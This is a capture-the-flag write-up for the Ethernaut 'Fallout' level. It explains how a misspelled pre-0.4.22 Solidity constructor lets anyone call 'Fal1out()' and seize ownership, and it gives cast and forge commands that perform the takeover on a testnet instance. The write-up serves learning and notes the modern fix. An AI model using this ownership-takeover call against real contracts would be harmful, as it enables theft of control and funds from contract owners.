# Ethernaut Challenge 02 — Fallout

Claim ownership of the contract.

Instance address:

```
0x01E64cF1C2DAD941D160f08C762994554490E68f
```

---

## 🎯 Goal

1. Claim ownership of the contract

---

## 🔎 Reading the Contract

Let's look closely at how the contract is initialized. Prior to Solidity 0.4.22, constructors were defined by creating a function with the **exact same name** as the contract.

The contract is named `Fallout`:

```solidity
contract Fallout {
    // ...
```

But its constructor function is named `Fal1out` (notice the `1` instead of an `l`):

```solidity
/* constructor */
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

Because of this typo, the compiler treats `Fal1out` as a normal, public function rather than a constructor. This means anyone can call it at any time after the contract is deployed.

---

## 🧠 Attack Strategy

1. Call the public function `Fal1out()` to overwrite the `owner` variable with your address.

---

## 💻 Solution

### Using Foundry (cast)

```bash
cast send $INSTANCE "Fal1out()" \
  --value 0.0001ether \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

### Using Forge Script

```bash
forge script script/02-Fallout.s.sol --rpc-url sepolia --broadcast -vvvv
```

The [script](../../script/02-Fallout.s.sol) executes the attack in a single transaction, claiming ownership.

---

## 🛡️ Key Takeaway

- **Typo-squatting / Naming mistakes**: Prior to Solidity 0.4.22, a simple typo in the constructor name meant it became a regular public function, leading to catastrophic vulnerabilities (like the famous Rubixi hack).
- Modern versions of Solidity (>=0.4.22) use the `constructor()` keyword to prevent this exact issue.

---

## 📜 My Transaction

https://sepolia.etherscan.io/tx/0x27a244391481e8149b217e2be72e7a8f2ba87032a7381485d5e0d2f252853c88
